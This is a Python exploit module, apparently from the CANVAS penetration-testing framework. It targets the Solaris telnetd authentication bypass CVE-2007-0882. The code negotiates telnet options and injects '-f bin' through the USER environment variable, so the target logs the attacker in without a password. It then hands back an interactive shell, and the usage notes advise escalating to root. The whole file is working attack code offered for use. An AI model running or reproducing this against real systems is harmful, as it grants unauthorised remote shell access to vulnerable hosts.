#! /usr/bin/env python
"""
solaris_telnet.py

Logs into a Unix host via telnetd using a solaris vulnerability
to bypass authentication

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

BUGS="""

"""

import sys
if "." not in sys.path: sys.path.append(".")
import socket
from exploitutils import *
from libs.ctelnetlib import *
from tcpexploit import tcpexploit
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import unixShellNode
import timeoutsocket


DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="02/10/2007"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/881872"
DOCUMENTATION["CVE Name"] = "CVE-2007-0882"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0882"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]=["http://sunsolve.sun.com/search/document.do?assetkey=1-26-102802-1", 
                             "http://blogs.sun.com/tpenta/entry/the_in_telnetd_vulnerability_exploit",
                             "http://blogs.zdnet.com/security/?p=31",
                             "http://www.milw0rm.com/exploits/3293",
                         ]

DOCUMENTATION["Usage"] = "Set username bin, with no password. Then \
use bin2root.sh to get full root priviledges." 


DESCRIPTION="Telnet to host without having to authenticate due to flaw in environment variable passing"

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"] ]
PROPERTY['VERSION'] = [ "10", "11" ]

NAME="solaris_telnet"

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(23)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00"
        self.password=""
        self.prompt="$ "
        self.cshprompt="% "
        self.name=NAME
        self.user="bin"
        return

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.getarg("user")
        return 
    
    def test(self):
        """
        Right now we just test for port 23 - we'll add a check for
        Solaris later.
        """
        self.getargs()
        #result=self.osdetect(self.host)
        #if result.os=="Solaris":
        #...
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s'%(self.port))
            return 0
        s.close()
        return 1

            
    def options(self, sock, command, opt):
        """
        Handle the options coming from the remote telnet session
        These have to be exactly right for the exploit to work. 
        
        Knowing this much about telnet the protocol is something I never thought would happen.
        """
        handled=False 
        self.log("Command: %s opt: %s"%(prettyhexprint(command),prettyhexprint(opt)))
        if command==DO and opt==AUTHENTICATION:
            #FD 25
            self.log("Responding with WONT+DONT AUTHENTICATE")
            response=IAC+WONT+AUTHENTICATION
            self.tn.write_raw(response)
            handled=True 
            
        elif command==WILL and opt==ENCRYPT:
            self.log("Responding with WONT ENCRYPT")
            response=IAC+DONT+ENCRYPT
            self.tn.write_raw(response)
            handled=True
        elif command==DONT and opt in [NAWS, LINEMODE, TSPEED, STATUS, TTYPE, LFLOW, OLD_ENVIRON]:
            response=IAC+WONT+opt
            self.tn.write_raw(response)
            handled=True
            
        elif command==DO and opt==TTYPE:
            #xterm
            self.log("sending TTYPE = xterm")
            response=binstring("ff fa 18 00 78 74 65 72 6d 00 ff f0")
            response=IAC+WONT+TTYPE
            self.tn.write_raw(response)
            handled=True
            
        if command==DO and opt in [OLD_ENVIRON, ENCRYPT, XDISPLOC]:    
            self.log("Responding with DONT %s"%prettyhexprint(opt))
            #response=IAC+DONT+opt 
            response=IAC+WONT+opt 
            self.tn.write_raw(response)
            handled=True 

        if command==DO and opt in [ NEW_ENVIRON, ECHO, SGA ] :
            self.tn.write_raw(IAC + WILL + opt)
            handled=True 
        if command=="\xf0" and opt=="\x00":
            #ignore this end of sub-command request
            handled=True 
            
        if command==SB:
            self.log("Sending environment with user %s"%self.user)
            self.tn.write_raw(IAC + SB + binstring("27 00 00") + "USER\x01-f"+self.user+"\xff\xf0")
            handled=True 
            
        if not handled:
            self.log("Option %s not handled"%prettyhexprint(opt))
        return 
    
    def run(self):
        """
        Actually exploit the target.
        """
        self.getargs()

        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        #Root will almost never be able to log in remotely
        #but if you have the root password, you can avoid
        #the console check using this exploit - which is not implemented yet
        if self.user=="root":
            self.prompt="#"

        self.log("Shell prompt set to: %s"%self.prompt)
        #first make socket connection to target
        self.log("Connecting to %s:%d"%(self.host,self.port))
        tn = Telnet(None,None,getsock=self, callback=self.options)
        self.tn=tn
        #tn.debuglevel=1
        #we do this now after we set self.tn
        try:
            tn.open(self.host, int(self.port))
        except socket.error, msg:
            self.log("Did not connect: %s"%msg)
            self.log("Solaris 10 has some weird rate-limiting thing. Try again later")
            return 0
        except timeoutsocket.Timeout:
            self.log("connect timed out")
            return 0
        self.log("Connected")
        self.setProgress(25)
        header_packet=""
        #header_packet+=IAC 
        for c in ["\x18", "\x1f", "\x20" , "\x21" , "\x22", "\x27", "\x05", "\x23"]:
            self.tn.write_raw(IAC +WILL+c)
        
        tn.write_raw(header_packet)
        #timeout_in_seconds=60*5+2
        #self.log("Waiting %d seconds for painful Solaris timeouts"%timeout_in_seconds)
        tn.get_socket().set_timeout(1)
        data=""
        count=0
        while count<40 and data in ["","\x1c", "\x03"]:
            count+=1
            try:
                data=tn.read_some()
            except timeoutsocket.Timeout, info:
                pass
            except Exception, info:
                # seriously, why does the above not catch timeoutsocket.Timeout? :(
                if not str(info).startswith("Recv timed out"):
                    raise
                
        
        if data:
            self.log("Got: %s"%prettyprint(data))
            for i in xrange(0,5):
                time.sleep(1)
                try:
                    data+=tn.read_some()
                
                # okay, there's something weird going on here; why doesn't this except
                # catch the Timeout?
                # >>> sys.exc_info()[0]
                # <class 'timeoutsocket.Timeout'>
                # >>> timeoutsocket.Timeout
                # <class 'timeoutsocket.Timeout'>
                # >>> sys.exc_info()[0] == timeoutsocket.Timeout
                # False
                # :(
                except timeoutsocket.Timeout, info:
                    pass
                # Ugh. :/
                except Exception, info:
                    if "timed out" in sys.exc_info()[1].args[0]:
                        pass
                    else:
                        raise
                
        self.log("Data: '%s'"%data)
        self.setProgress(50)
        if data.count(self.prompt)==0 and data.count(self.cshprompt)==0:
            #we failed to log in
            self.log("We failed to log in.")
            self.setInfo("%s attacked %s:%d (failed)"%(NAME,self.host,self.port))
            return None
        
        if data.count(self.cshprompt):
            self.prompt="% "

        self.setProgress(75)
        node=unixShellNode.unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]        
        shell=shelllistener(shellfromtelnet(tn))
        node.shell=shell
        shell.node=node
        self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
        return node

        

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()


